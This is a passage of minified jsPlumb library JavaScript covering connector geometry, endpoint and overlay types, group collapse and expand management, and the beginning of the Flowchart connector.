e.segment&&e.segment.gradientAtPoint(e.proportion,!1)||0},this.pointAlongPathFrom=function(n,t,e){var o=C(n,e);return o.segment&&o.segment.pointAlongPathFrom(o.proportion,t,!1)||[0,0]},this.compute=function(n){p=b.call(this,n),d=r.length=_.length=s.length=0,this._compute(p,n),this.x=p.points[0],this.y=p.points[1],this.w=p.points[2],this.h=p.points[3],this.segment=p.segment,function(){for(var n=0,t=0;t<r.length;t++){var e=r[t].getLength();s[t]=e/d,_[t]=[n,n+=e/d]}}()},{addSegment:function(n,e,o){if(o.x1!==o.x2||o.y1!==o.y2){var i=new t.Segments[e](o);r.push(i),d+=i.getLength(),n.updateBounds(i)}},prepareCompute:b,sourceStub:w,targetStub:l,maxStub:Math.max(w,l),sourceGap:c,targetGap:B,maxGap:Math.max(c,B),setGeometry:m,getGeometry:v}},e.extend(t.Connectors.AbstractConnector,i),t.Endpoints.AbstractEndpoint=function(n){return i.apply(this,arguments),{compute:this.compute=function(n,t,e,o){var i=this._compute.apply(this,arguments);return this.x=i[0],this.y=i[1],this.w=i[2],this.h=i[3],this.bounds.minX=this.x,this.bounds.minY=this.y,this.bounds.maxX=this.x+this.w,this.bounds.maxY=this.y+this.h,i},cssClass:n.cssClass}},e.extend(t.Endpoints.AbstractEndpoint,i),t.Endpoints.Dot=function(n){this.type="Dot",t.Endpoints.AbstractEndpoint.apply(this,arguments),n=n||{},this.radius=n.radius||10,this.defaultOffset=.5*this.radius,this.defaultInnerRadius=this.radius/3,this._compute=function(n,t,e,o){this.radius=e.radius||this.radius;var i=n[0]-this.radius,r=n[1]-this.radius,d=2*this.radius,_=2*this.radius;if(e.stroke){var s=e.strokeWidth||1;i-=s,r-=s,d+=2*s,_+=2*s}return[i,r,d,_,this.radius]}},e.extend(t.Endpoints.Dot,t.Endpoints.AbstractEndpoint),t.Endpoints.Rectangle=function(n){this.type="Rectangle",t.Endpoints.AbstractEndpoint.apply(this,arguments),n=n||{},this.width=n.width||20,this.height=n.height||20,this._compute=function(n,t,e,o){var i=e.width||this.width,r=e.height||this.height;return[n[0]-i/2,n[1]-r/2,i,r]}},e.extend(t.Endpoints.Rectangle,t.Endpoints.AbstractEndpoint);var r=function(n){t.jsPlumbUIComponent.apply(this,arguments),this._jsPlumb.displayElements=[]};e.extend(r,t.jsPlumbUIComponent,{getDisplayElements:function(){return this._jsPlumb.displayElements},appendDisplayElement:function(n){this._jsPlumb.displayElements.push(n)}}),t.Endpoints.Image=function(o){this.type="Image",r.apply(this,arguments),t.Endpoints.AbstractEndpoint.apply(this,arguments);var i=o.onload,d=o.src||o.url,_=o.cssClass?" "+o.cssClass:"";this._jsPlumb.img=new Image,this._jsPlumb.ready=!1,this._jsPlumb.initialized=!1,this._jsPlumb.deleted=!1,this._jsPlumb.widthToUse=o.width,this._jsPlumb.heightToUse=o.height,this._jsPlumb.endpoint=o.endpoint,this._jsPlumb.img.onload=function(){null!=this._jsPlumb&&(this._jsPlumb.ready=!0,this._jsPlumb.widthToUse=this._jsPlumb.widthToUse||this._jsPlumb.img.width,this._jsPlumb.heightToUse=this._jsPlumb.heightToUse||this._jsPlumb.img.height,i&&i(this))}.bind(this),this._jsPlumb.endpoint.setImage=function(n,t){var e=n.constructor===String?n:n.src;i=t,this._jsPlumb.img.src=e,null!=this.canvas&&this.canvas.setAttribute("src",this._jsPlumb.img.src)}.bind(this),this._jsPlumb.endpoint.setImage(d,i),this._compute=function(n,t,e,o){return this.anchorPoint=n,this._jsPlumb.ready?[n[0]-this._jsPlumb.widthToUse/2,n[1]-this._jsPlumb.heightToUse/2,this._jsPlumb.widthToUse,this._jsPlumb.heightToUse]:[0,0,0,0]},this.canvas=t.createElement("img",{position:"absolute",margin:0,padding:0,outline:0},this._jsPlumb.instance.endpointClass+_),this._jsPlumb.widthToUse&&this.canvas.setAttribute("width",this._jsPlumb.widthToUse),this._jsPlumb.heightToUse&&this.canvas.setAttribute("height",this._jsPlumb.heightToUse),this._jsPlumb.instance.appendElement(this.canvas),this.actuallyPaint=function(n,t,o){if(!this._jsPlumb.deleted){this._jsPlumb.initialized||(this.canvas.setAttribute("src",this._jsPlumb.img.src),this.appendDisplayElement(this.canvas),this._jsPlumb.initialized=!0);var i=this.anchorPoint[0]-this._jsPlumb.widthToUse/2,r=this.anchorPoint[1]-this._jsPlumb.heightToUse/2;e.sizeElement(this.canvas,i,r,this._jsPlumb.widthToUse,this._jsPlumb.heightToUse)}},this.paint=function(t,e){null!=this._jsPlumb&&(this._jsPlumb.ready?this.actuallyPaint(t,e):n.setTimeout(function(){this.paint(t,e)}.bind(this),200))}},e.extend(t.Endpoints.Image,[r,t.Endpoints.AbstractEndpoint],{cleanup:function(n){n&&(this._jsPlumb.deleted=!0,this.canvas&&this.canvas.parentNode.removeChild(this.canvas),this.canvas=null)}}),t.Endpoints.Blank=function(n){t.Endpoints.AbstractEndpoint.apply(this,arguments),this.type="Blank",r.apply(this,arguments),this._compute=function(n,t,e,o){return[n[0],n[1],10,0]};var o=n.cssClass?" "+n.cssClass:"";this.canvas=t.createElement("div",{display:"block",width:"1px",height:"1px",background:"transparent",position:"absolute"},this._jsPlumb.instance.endpointClass+o),this._jsPlumb.instance.appendElement(this.canvas),this.paint=function(n,t){e.sizeElement(this.canvas,this.x,this.y,this.w,this.h)}},e.extend(t.Endpoints.Blank,[t.Endpoints.AbstractEndpoint,r],{cleanup:function(){this.canvas&&this.canvas.parentNode&&this.canvas.parentNode.removeChild(this.canvas)}}),t.Endpoints.Triangle=function(n){this.type="Triangle",t.Endpoints.AbstractEndpoint.apply(this,arguments);var e=this;(n=n||{}).width=n.width||55,n.height=n.height||55,this.width=n.width,this.height=n.height,this._compute=function(n,t,o,i){var r=o.width||e.width,d=o.height||e.height;return[n[0]-r/2,n[1]-d/2,r,d]}};var d=t.Overlays.AbstractOverlay=function(n){this.visible=!0,this.isAppendedAtTopLevel=!0,this.component=n.component,this.loc=null==n.location?.5:n.location,this.endpointLoc=null==n.endpointLocation?[.5,.5]:n.endpointLocation,this.visible=!1!==n.visible};d.prototype={cleanup:function(n){n&&(this.component=null,this.canvas=null,this.endpointLoc=null)},reattach:function(n,t){},setVisible:function(n){this.visible=n,this.component.repaint()},isVisible:function(){return this.visible},hide:function(){this.setVisible(!1)},show:function(){this.setVisible(!0)},incrementLocation:function(n){this.loc+=n,this.component.repaint()},setLocation:function(n){this.loc=n,this.component.repaint()},getLocation:function(){return this.loc},updateFrom:function(){}},t.Overlays.Arrow=function(n){this.type="Arrow",d.apply(this,arguments),this.isAppendedAtTopLevel=!1,n=n||{};var i=this;this.length=n.length||20,this.width=n.width||20,this.id=n.id;var r=(n.direction||1)<0?-1:1,_=n.paintStyle||{"stroke-width":1},s=n.foldback||.623;this.computeMaxSize=function(){return 1.5*i.width},this.elementCreated=function(e,o){if(this.path=e,n.events)for(var i in n.events)t.on(e,i,n.events[i])},this.draw=function(n,t){var i,d,a,w;if(n.pointAlongPathFrom){if(e.isString(this.loc)||this.loc>1||this.loc<0){var l=parseInt(this.loc,10),u=this.loc<0?1:0;i=n.pointAlongPathFrom(u,l,!1),d=n.pointAlongPathFrom(u,l-r*this.length/2,!1),a=o.pointOnLine(i,d,this.length)}else if(1===this.loc){if(i=n.pointOnPath(this.loc),d=n.pointAlongPathFrom(this.loc,-this.length),a=o.pointOnLine(i,d,this.length),-1===r){var c=a;a=i,i=c}}else if(0===this.loc){if(a=n.pointOnPath(this.loc),d=n.pointAlongPathFrom(this.loc,this.length),i=o.pointOnLine(a,d,this.length),-1===r){var B=a;a=i,i=B}}else i=n.pointAlongPathFrom(this.loc,r*this.length/2),d=n.pointOnPath(this.loc),a=o.pointOnLine(i,d,this.length);var h={hxy:i,tail:w=o.perpendicularLineTo(i,a,this.width),cxy:o.pointOnLine(i,a,s*this.length)},j=_.stroke||t.stroke,p=_.fill||t.stroke;return{component:n,d:h,"stroke-width":_.strokeWidth||t.strokeWidth,stroke:j,fill:p,minX:Math.min(i.x,w[0].x,w[1].x),maxX:Math.max(i.x,w[0].x,w[1].x),minY:Math.min(i.y,w[0].y,w[1].y),maxY:Math.max(i.y,w[0].y,w[1].y)}}return{component:n,minX:0,maxX:0,minY:0,maxY:0}}},e.extend(t.Overlays.Arrow,d,{updateFrom:function(n){this.length=n.length||this.length,this.width=n.width||this.width,this.direction=null!=n.direction?n.direction:this.direction,this.foldback=n.foldback||this.foldback}}),t.Overlays.PlainArrow=function(n){n=n||{};var e=t.extend(n,{foldback:1});t.Overlays.Arrow.call(this,e),this.type="PlainArrow"},e.extend(t.Overlays.PlainArrow,t.Overlays.Arrow),t.Overlays.Diamond=function(n){var e=(n=n||{}).length||40,o=t.extend(n,{length:e/2,foldback:2});t.Overlays.Arrow.call(this,o),this.type="Diamond"},e.extend(t.Overlays.Diamond,t.Overlays.Arrow);var _=function(n,t){return(null==n._jsPlumb.cachedDimensions||t)&&(n._jsPlumb.cachedDimensions=n.getDimensions()),n._jsPlumb.cachedDimensions},s=function(n){t.jsPlumbUIComponent.apply(this,arguments),d.apply(this,arguments);var o=this.fire;this.fire=function(){o.apply(this,arguments),this.component&&this.component.fire.apply(this.component,arguments)},this.detached=!1,this.id=n.id,this._jsPlumb.div=null,this._jsPlumb.initialised=!1,this._jsPlumb.component=n.component,this._jsPlumb.cachedDimensions=null,this._jsPlumb.create=n.create,this._jsPlumb.initiallyInvisible=!1===n.visible,this.getElement=function(){if(null==this._jsPlumb.div){var e=this._jsPlumb.div=t.getElement(this._jsPlumb.create(this._jsPlumb.component));e.style.position="absolute",e.className=this._jsPlumb.instance.overlayClass+" "+(this.cssClass?this.cssClass:n.cssClass?n.cssClass:""),this._jsPlumb.instance.appendElement(e),this._jsPlumb.instance.getId(e),this.canvas=e;var o="translate(-50%, -50%)";e.style.webkitTransform=o,e.style.mozTransform=o,e.style.msTransform=o,e.style.oTransform=o,e.style.transform=o,e._jsPlumb=this,!1===n.visible&&(e.style.display="none")}return this._jsPlumb.div},this.draw=function(n,t,o){var i=_(this);if(null!=i&&2===i.length){var r={x:0,y:0};if(o)r={x:o[0],y:o[1]};else if(n.pointOnPath){var d=this.loc,s=!1;(e.isString(this.loc)||this.loc<0||this.loc>1)&&(d=parseInt(this.loc,10),s=!0),r=n.pointOnPath(d,s)}else{var a=this.loc.constructor===Array?this.loc:this.endpointLoc;r={x:a[0]*n.w,y:a[1]*n.h}}var w=r.x-i[0]/2,l=r.y-i[1]/2;return{component:n,d:{minx:w,miny:l,td:i,cxy:r},minX:w,maxX:w+i[0],minY:l,maxY:l+i[1]}}return{minX:0,maxX:0,minY:0,maxY:0}}};e.extend(s,[t.jsPlumbUIComponent,d],{getDimensions:function(){return[1,1]},setVisible:function(n){this._jsPlumb.div&&(this._jsPlumb.div.style.display=n?"block":"none",n&&this._jsPlumb.initiallyInvisible&&(_(this,!0),this.component.repaint(),this._jsPlumb.initiallyInvisible=!1))},clearCachedDimensions:function(){this._jsPlumb.cachedDimensions=null},cleanup:function(n){n?null!=this._jsPlumb.div&&(this._jsPlumb.div._jsPlumb=null,this._jsPlumb.instance.removeElement(this._jsPlumb.div)):(this._jsPlumb&&this._jsPlumb.div&&this._jsPlumb.div.parentNode&&this._jsPlumb.div.parentNode.removeChild(this._jsPlumb.div),this.detached=!0)},reattach:function(n,t){null!=this._jsPlumb.div&&n.getContainer().appendChild(this._jsPlumb.div),this.detached=!1},computeMaxSize:function(){var n=_(this);return Math.max(n[0],n[1])},paint:function(n,t){this._jsPlumb.initialised||(this.getElement(),n.component.appendDisplayElement(this._jsPlumb.div),this._jsPlumb.initialised=!0,this.detached&&this._jsPlumb.div.parentNode.removeChild(this._jsPlumb.div)),this._jsPlumb.div.style.left=n.component.x+n.d.minx+"px",this._jsPlumb.div.style.top=n.component.y+n.d.miny+"px"}}),t.Overlays.Custom=function(n){this.type="Custom",s.apply(this,arguments)},e.extend(t.Overlays.Custom,s),t.Overlays.GuideLines=function(){var n=this;n.length=50,n.strokeWidth=5,this.type="GuideLines",d.apply(this,arguments),t.jsPlumbUIComponent.apply(this,arguments),this.draw=function(t,e){var i=t.pointAlongPathFrom(n.loc,n.length/2),r=t.pointOnPath(n.loc),d=o.pointOnLine(i,r,n.length),_=o.perpendicularLineTo(i,d,40),s=o.perpendicularLineTo(d,i,20);return{connector:t,head:i,tail:d,headLine:s,tailLine:_,minX:Math.min(i.x,d.x,s[0].x,s[1].x),minY:Math.min(i.y,d.y,s[0].y,s[1].y),maxX:Math.max(i.x,d.x,s[0].x,s[1].x),maxY:Math.max(i.y,d.y,s[0].y,s[1].y)}}},t.Overlays.Label=function(n){this.labelStyle=n.labelStyle,this.cssClass=null!=this.labelStyle?this.labelStyle.cssClass:null;var e=t.extend({create:function(){return t.createElement("div")}},n);if(t.Overlays.Custom.call(this,e),this.type="Label",this.label=n.label||"",this.labelText=null,this.labelStyle){var o=this.getElement();if(this.labelStyle.font=this.labelStyle.font||"12px sans-serif",o.style.font=this.labelStyle.font,o.style.color=this.labelStyle.color||"black",this.labelStyle.fill&&(o.style.background=this.labelStyle.fill),this.labelStyle.borderWidth>0){var i=this.labelStyle.borderStyle?this.labelStyle.borderStyle:"black";o.style.border=this.labelStyle.borderWidth+"px solid "+i}this.labelStyle.padding&&(o.style.padding=this.labelStyle.padding)}},e.extend(t.Overlays.Label,t.Overlays.Custom,{cleanup:function(n){n&&(this.div=null,this.label=null,this.labelText=null,this.cssClass=null,this.labelStyle=null)},getLabel:function(){return this.label},setLabel:function(n){this.label=n,this.labelText=null,this.clearCachedDimensions(),this.update(),this.component.repaint()},getDimensions:function(){return this.update(),s.prototype.getDimensions.apply(this,arguments)},update:function(){if("function"==typeof this.label){var n=this.label(this);this.getElement().innerHTML=n.replace(/\r\n/g,"<br/>")}else null==this.labelText&&(this.labelText=this.label,this.getElement().innerHTML=this.labelText.replace(/\r\n/g,"<br/>"))},updateFrom:function(n){null!=n.label&&this.setLabel(n.label)}})}.call("undefined"!=typeof window?window:this),function(){var n=this;n.jsPlumb.extend(n.jsPlumbInstance.prototype,{getEventManager:function(){return(e=(t=this)._mottle)||(e=t._mottle=new n.Mottle),e;var t,e},on:function(n,t,e){return this.getEventManager().on.apply(this,arguments),this},off:function(n,t,e){return this.getEventManager().off.apply(this,arguments),this}})}.call("undefined"!=typeof window?window:this),function(){var n=this,t=n.jsPlumbUtil,e=n.jsPlumbInstance,o="jtk-group-collapsed",i="jtk-group-expanded",r="stop",d="revert",_="_groupManager",s="_jsPlumbGroup",a="group:addMember",w="show",l="hide",u=function(n){function e(t,e){for(var o=t.getMembers(),i=0;i<o.length;i++)n[e?w:l](o[i],!0)}function r(t){var e=t.getMembers(),o=n.getConnections({source:e,scope:"*"},!0),i=n.getConnections({target:e,scope:"*"},!0),r={};t.connections.source.length=0,t.connections.target.length=0;var d=function(n){for(var e=0;e<n.length;e++)r[n[e].id]||(r[n[e].id]=!0,n[e].source._jsPlumbGroup===t?(n[e].target._jsPlumbGroup!==t&&t.connections.source.push(n[e]),_[n[e].id]=t):n[e].target._jsPlumbGroup===t&&(t.connections.target.push(n[e]),u[n[e].id]=t))};d(o),d(i)}var d={},_={},u={},c=this;n.bind("connection",function(n){null!=n.source[s]&&null!=n.target[s]&&n.source[s]===n.target[s]?(_[n.connection.id]=n.source[s],u[n.connection.id]=n.source[s]):(null!=n.source[s]&&(t.suggest(n.source[s].connections.source,n.connection),_[n.connection.id]=n.source[s]),null!=n.target[s]&&(t.suggest(n.target[s].connections.target,n.connection),u[n.connection.id]=n.target[s]))}),n.bind("internal.connectionDetached",function(n){!function(n){delete n.proxies;var e,o=_[n.id];null!=o&&(e=function(t){return t.id===n.id},t.removeWithFunction(o.connections.source,e),t.removeWithFunction(o.connections.target,e),delete _[n.id]),null!=(o=u[n.id])&&(e=function(t){return t.id===n.id},t.removeWithFunction(o.connections.source,e),t.removeWithFunction(o.connections.target,e),delete u[n.id])}(n.connection)}),n.bind("connectionMoved",function(n){var t=(0===n.index?_:u)[n.connection.id];if(t){var e=t.connections[0===n.index?"source":"target"],o=e.indexOf(n.connection);-1!==o&&e.splice(o,1)}}),this.addGroup=function(t){n.addClass(t.getEl(),i),d[t.id]=t,t.manager=this,r(t),n.fire("group:add",{group:t})},this.addToGroup=function(t,e,o){if(t=this.getGroup(t)){var i=t.getEl();if(e._isJsPlumbGroup)return;var r=e._jsPlumbGroup;if(r!==t){var d=n.getOffset(e,!0),_=t.collapsed?n.getOffset(i,!0):n.getOffset(t.getDragArea(),!0);null!=r&&(r.remove(e,o),c.updateConnectionsForGroup(r)),t.add(e,o);var s=function(n,e){var o=0===e?1:0;n.each(function(n){n.setVisible(!1),n.endpoints[o].element._jsPlumbGroup===t?(n.endpoints[o].setVisible(!1),c.expandConnection(n,o,t)):(n.endpoints[e].setVisible(!1),c.collapseConnection(n,e,t))})};t.collapsed&&(s(n.select({source:e}),0),s(n.select({target:e}),1));var w=n.getId(e);n.dragManager.setParent(e,w,i,n.getId(i),d);var l={left:d.left-_.left,top:d.top-_.top};n.setPosition(e,l),n.dragManager.revalidateParent(e,w,d),c.updateConnectionsForGroup(t),n.revalidate(w),setTimeout(function(){n.fire(a,{group:t,el:e})},0)}}},this.removeFromGroup=function(n,t,e){(n=this.getGroup(n))&&n.remove(t,null,e)},this.getGroup=function(n){var e=n;if(t.isString(n)&&null==(e=d[n]))throw new TypeError("No such group ["+n+"]");return e},this.getGroups=function(){var n=[];for(var t in d)n.push(d[t]);return n},this.removeGroup=function(t,e,o,i){t=this.getGroup(t),this.expandGroup(t,!0),t[e?"removeAll":"orphanAll"](o,i),n.remove(t.getEl()),delete d[t.id],delete n._groups[t.id],n.fire("group:remove",{group:t})},this.removeAllGroups=function(n,t,e){for(var o in d)this.removeGroup(d[o],n,t,e)};var B=this.collapseConnection=function(t,e,o){var i,r=o.getEl(),d=n.getId(r),_=t.endpoints[e].elementId,a=t.endpoints[0===e?1:0].element;a[s]&&!a[s].shouldProxy()&&a[s].collapsed||(t.proxies=t.proxies||[],(i=t.proxies[e]?t.proxies[e].ep:n.addEndpoint(r,{endpoint:o.getEndpoint(t,e),anchor:o.getAnchor(t,e),parameters:{isProxyEndpoint:!0}})).setDeleteOnEmpty(!0),t.proxies[e]={ep:i,originalEp:t.endpoints[e]},0===e?n.anchorManager.sourceChanged(_,d,t,r):(n.anchorManager.updateOtherEndpoint(t.endpoints[0].elementId,_,d,t),t.target=r,t.targetId=d),t.proxies[e].originalEp.detachFromConnection(t,null,!0),i.connections=[t],t.endpoints[e]=i,t.setVisible(!0))};this.collapseGroup=function(t){if(null!=(t=this.getGroup(t))&&!t.collapsed){var r=t.getEl();if(e(t,!1),t.shouldProxy()){var d=function(n,e){for(var o=0;o<n.length;o++){var i=n[o];B(i,e,t)}};d(t.connections.source,0),d(t.connections.target,1)}t.collapsed=!0,n.removeClass(r,i),n.addClass(r,o),n.revalidate(r),n.fire("group:collapse",{group:t})}};var h=this.expandConnection=function(t,e,o){if(null!=t.proxies&&null!=t.proxies[e]){var i=n.getId(o.getEl()),r=t.proxies[e].originalEp.element,d=t.proxies[e].originalEp.elementId;t.endpoints[e]=t.proxies[e].originalEp,0===e?n.anchorManager.sourceChanged(i,d,t,r):(n.anchorManager.updateOtherEndpoint(t.endpoints[0].elementId,i,d,t),t.target=r,t.targetId=d),t.proxies[e].ep.detachFromConnection(t,null),t.proxies[e].originalEp.addConnection(t),delete t.proxies[e]}};this.expandGroup=function(t,r){if(null!=(t=this.getGroup(t))&&t.collapsed){var d=t.getEl();if(e(t,!0),t.shouldProxy()){var _=function(n,e){for(var o=0;o<n.length;o++){var i=n[o];h(i,e,t)}};_(t.connections.source,0),_(t.connections.target,1)}t.collapsed=!1,n.addClass(d,i),n.removeClass(d,o),n.revalidate(d),this.repaintGroup(t),r||n.fire("group:expand",{group:t})}},this.repaintGroup=function(t){for(var e=(t=this.getGroup(t)).getMembers(),o=0;o<e.length;o++)n.revalidate(e[o])},this.updateConnectionsForGroup=r,this.refreshAllGroups=function(){for(var t in d)r(d[t]),n.dragManager.updateOffsets(n.getId(d[t].getEl()))}},c=function(e,o){function i(n,t){var o=function(n){return n.offsetParent}(n),i=e.getSize(o),r=e.getSize(n),d=t[0],_=d+r[0],s=t[1],a=s+r[1];return _>0&&d<i[0]&&a>0&&s<i[1]}function _(n){var t=e.getId(n),o=e.getOffset(n);n.parentNode.removeChild(n),e.getContainer().appendChild(n),e.setPosition(n,o),delete n._jsPlumbGroup,u(n),e.dragManager.clearParent(n,t)}function w(n){if(!i(n.el,n.pos)){var t=n.el._jsPlumbGroup;v?e.remove(n.el):_(n.el),t.remove(n.el)}}function l(n){var t=e.getId(n);e.revalidate(n),e.dragManager.revalidateParent(n,t)}function u(n){n._katavorioDrag&&((v||m)&&n._katavorioDrag.off(r,w),v||m||!g||(n._katavorioDrag.off(d,l),n._katavorioDrag.setRevert(null)))}function c(n){n._katavorioDrag&&((v||m)&&n._katavorioDrag.on(r,w),f&&n._katavorioDrag.setConstrain(!0),p&&n._katavorioDrag.setUseGhostProxy(!0),v||m||!g||(n._katavorioDrag.on(d,l),n._katavorioDrag.setRevert(function(n,t){return!i(n,t)})))}var B=this,h=o.el;this.getEl=function(){return h},this.id=o.id||t.uuid(),h._isJsPlumbGroup=!0;var j=this.getDragArea=function(){var n=e.getSelector(h,"[jtk-group-content]");return n&&n.length>0?n[0]:h},p=!0===o.ghost,f=p||!0===o.constrain,g=!1!==o.revert,m=!0===o.orphan,v=!0===o.prune,C=!0===o.dropOverride,b=!1!==o.proxied,y=[];if(this.connections={source:[],target:[],internal:[]},this.getAnchor=function(n,t){return o.anchor||"Continuous"},this.getEndpoint=function(n,t){return o.endpoint||["Dot",{radius:10}]},this.collapsed=!1,!1!==o.draggable){var D={stop:function(n){e.fire("groupDragStop",jsPlumb.extend(n,{group:B}))},scope:"_jsPlumbGroupDrag"};o.dragOptions&&n.jsPlumb.extend(D,o.dragOptions),e.draggable(o.el,D)}!1!==o.droppable&&e.droppable(o.el,{drop:function(n){var t=n.drag.el;if(!t._isJsPlumbGroup){var o=t._jsPlumbGroup;if(o!==B){if(null!=o&&o.overrideDrop(t,B))return;e.getGroupManager().addToGroup(B,t,!1)}}}});var P=function(n,t){for(var e=null==n.nodeType?n:[n],o=0;o<e.length;o++)t(e[o])};this.overrideDrop=function(n,t){return C&&(g||v||m)},this.add=function(n,t){var o=j();P(n,function(n){if(null!=n._jsPlumbGroup){if(n._jsPlumbGroup===B)return;n._jsPlumbGroup.remove(n,!0,t,!1)}n._jsPlumbGroup=B,y.push(n),e.isAlreadyDraggable(n)&&c(n),n.parentNode!==o&&o.appendChild(n),t||e.fire(a,{group:B,el:n})}),e.getGroupManager().updateConnectionsForGroup(B)},this.remove=function(n,o,i,r){P(n,function(n){if(delete n._jsPlumbGroup,t.removeWithFunction(y,function(t){return t===n}),o)try{B.getDragArea().removeChild(n)}catch(n){jsPlumbUtil.log("Could not remove element from Group "+n)}u(n),i||e.fire("group:removeMember",{group:B,el:n})}),r||e.getGroupManager().updateConnectionsForGroup(B)},this.removeAll=function(n,t){for(var o=0,i=y.length;o<i;o++)B.remove(y[0],n,t,!0);y.length=0,e.getGroupManager().updateConnectionsForGroup(B)},this.orphanAll=function(){for(var n=0;n<y.length;n++)_(y[n]);y.length=0},this.getMembers=function(){return y},h[s]=this,e.bind("elementDraggable",function(n){n.el._jsPlumbGroup===this&&c(n.el)}.bind(this)),this.shouldProxy=function(){return b},e.getGroupManager().addGroup(this)};e.prototype.addGroup=function(n){var t=this;if(t._groups=t._groups||{},null!=t._groups[n.id])throw new TypeError("cannot create Group ["+n.id+"]; a Group with that ID exists");if(null!=n.el[s])throw new TypeError("cannot create Group ["+n.id+"]; the given element is already a Group");var e=new c(t,n);return t._groups[e.id]=e,n.collapsed&&this.collapseGroup(e),e},e.prototype.addToGroup=function(n,t,e){var o=function(t){var o=this.getId(t);this.manage(o,t),this.getGroupManager().addToGroup(n,t,e)}.bind(this);if(Array.isArray(t))for(var i=0;i<t.length;i++)o(t[i]);else o(t)},e.prototype.removeFromGroup=function(n,t,e){this.getGroupManager().removeFromGroup(n,t,e)},e.prototype.removeGroup=function(n,t,e,o){this.getGroupManager().removeGroup(n,t,e,o)},e.prototype.removeAllGroups=function(n,t,e){this.getGroupManager().removeAllGroups(n,t,e)},e.prototype.getGroup=function(n){return this.getGroupManager().getGroup(n)},e.prototype.getGroups=function(){return this.getGroupManager().getGroups()},e.prototype.expandGroup=function(n){this.getGroupManager().expandGroup(n)},e.prototype.collapseGroup=function(n){this.getGroupManager().collapseGroup(n)},e.prototype.repaintGroup=function(n){this.getGroupManager().repaintGroup(n)},e.prototype.toggleGroup=function(n){null!=(n=this.getGroupManager().getGroup(n))&&this.getGroupManager()[n.collapsed?"expandGroup":"collapseGroup"](n)},e.prototype.getGroupManager=function(){var n=this[_];return null==n&&(n=this[_]=new u(this)),n},e.prototype.removeGroupManager=function(){delete this[_]},e.prototype.getGroupFor=function(n){if(n=this.getElement(n))return n[s]}}.call("undefined"!=typeof window?window:this),function(){var n=this.jsPlumb,t=this.jsPlumbUtil,e="Straight";n.Connectors.Flowchart=function(t){this.type="Flowchart",(t=t||{}).stub=null==t.stub?30:t.stub;var o,i=n.Connectors.AbstractConnector.apply(this,arguments),r=null==t.midpoint?.5:t.midpoint,d=!0===t.alwaysRespectStubs,_=null,s=null,a=null!=t.cornerRadius?t.cornerRadius:0,w=(t.loopbackRadius,function(n){return n<0?-1:0===n?0:1}),l=function(n){return[w(n[2]-n[0]),w(n[3]-n[1])]},u=function(n,t,e,o){if(_!==t||s!==e){var i=null==_?o.sx:_,r=null==s?o.sy:s,d=i===t?"v":"h";_=t,s=e,n.push([i,r,t,e,d])}},c=function(n){return Math.sqrt(Math.pow(n[0]-n[2],2)+Math.pow(n[1]-n[3],2))},B=function(n){var t=[];return t.push.apply(t,n),t},h=function(n,t,o){for(var r,d,_,s=null,w=0;w<t.length-1;w++){if(s=s||B(t[w]),r=B(t[w+1]),d=l(s),_=l(r),a>0&&s[4]!==r[4]){var u=Math.min(a,c(s),c(r));s[2]-=d[0]*u,s[3]-=d[1]*u,r[0]+=_[0]*u,r[1]+=_[1]*u;var h=d[1]===_[0]&&1===_[0]||d[1]===_[0]&&0===_[0]&&d[0]!==_[1]||d[1]===_[0]&&-1===_[0],j=r[1]>s[3]?1:-1,p=j===(r[0]>s[2]?1:-1),f=p&&h||!p&&!h?r[0]:s[2],g=p&&h||!p&&!h?s[3]:r[1];i.addSegment(n,e,{x1:s[0],y1:s[1],x2:s[2],y2:s[3]}),i.addSegment(n,"Arc",{r:u,x1:s[2],y1:s[3],x2:r[0],y2:r[1],cx:f,cy:g,ac:h})}else{var m=s[2]===s[0]?0:s[2]>s[0]?o.lw/2:-o.lw/2,v=s[3]===s[1]?0:s[3]>s[1]?o.lw/2:-o.lw/2;i.addSegment(n,e,{x1:s[0]-m,y1:s[1]-v,x2:s[2]+m,y2:s[3]+v})}s=r}null!=r&&i.addSegment(n,e,{x1:r[0],y1:r[1],x2:r[2],y2:r[3]})};this._compute=function(n,t){o=[],_=null,s=null;var e=this.getGeometry(),a=[n.x,n.y],w=[n.x+n.w,n.y+n.h];if((this.hasBeenEdited()||this.isEditing())&&null!=e&&null!=e.segments&&e.segments.length>0)o=e.segments,i.setGeometry({segments:o,sourcePos:a,targetPos:w});else{var l=function(){return[n.startStubX,n.startStubY,n.endStubX,n.endStubY]},c={perpendicular:l,orthogonal:l,opposite:function(t){var e=n,o="x"===t?0:1;return!d&&{x:function(){return 1===e.so[o]&&(e.startStubX>e.endStubX&&e.tx>e.startStubX||e.sx>e.endStubX&&e.tx>e.sx)||-1===e.so[o]&&(e.startStubX<e.endStubX&&e.tx<e.startStubX||e.sx<e.endStubX&&e.tx<e.sx)},y:function(){return 1===e.so[o]&&(e.startStubY>e.endStubY&&e.ty>e.startStubY||e.sy>e.endStubY&&e.ty>e.sy)||-1===e.so[o]&&(e.startStubY<e.endStubY&&e.ty<e.startStubY||e.sy<e.endStubY&&e.ty<e.sy)}}[t]()?{x:[(n.sx+n.tx)/2,n.startStubY,(n.sx+n.tx)/2,n.endStubY],y:[n.startStubX,(n.sy+n.ty)/2,n.endStubX,(n.sy+n.ty)/2]}[t]:[n.startStubX,n.startStubY,n.endStubX,n.endStubY]}}[n.anchorOrientation](n.sourceAxis),B="x"===n.sourceAxis?0:1,j="x"===n.sourceAxis?1:0,p=c[B],f=c[j],g=c[B+2],m=c[j+2];u(o,c[0],c[1],n);var v=n.startStubX+(n.endStubX-n.startStubX)*r,C=n.startStubY+(n.endStubY-n.startStubY)*r,b={x:[0,1],y:[1,0]},y={perpendicular:function(t){var 